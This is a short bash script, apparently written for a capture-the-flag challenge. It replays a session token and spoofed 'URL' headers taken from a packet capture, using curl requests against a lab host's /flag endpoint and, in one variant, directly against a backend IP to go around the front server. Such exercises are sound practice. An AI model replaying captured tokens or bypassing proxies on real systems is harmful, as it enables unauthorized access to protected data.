#!/bin/bash
# Found in the ORIGINAL magic.pcapng: a plaintext (non-base64) Session-Token
# header combined with a "URL" header pointing at /flag:
#   Session-Token: good-session-token
#   URL: /flag
# Testing this exact combo (and header-name variants) against the CURRENT
# magic-key.hkn instance.
TARGET="magic-key.hkn"

echo "### Variant 1: Session-Token (plaintext) + URL header, against /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: good-session-token" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### Variant 2: same, against /next_chars?char=s ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/next_chars?char=s" \
    -H "Session-Token: good-session-token" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### Variant 3: Session-Token (plaintext) + URL-Maybe header, against /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: good-session-token" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### Variant 4: same, against /next_chars?char=s ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/next_chars?char=s" \
    -H "Session-Token: good-session-token" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### Variant 5: BOTH URL and URL-Maybe headers present, against /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: good-session-token" \
    -H "URL: /flag" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### Variant 6: base64 of 'good-session-token' as Session-Token, + URL: /flag ###"
TOKEN_B64=$(echo -n "good-session-token" | base64 -w0 | tr -d '=')
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: $TOKEN_B64" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### Variant 7: plain token against secret-server directly (.37), /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://77.76.10.37/flag" \
    -H "Session-Token: good-session-token" \
    -H "URL: /flag"
echo ""; echo "---"
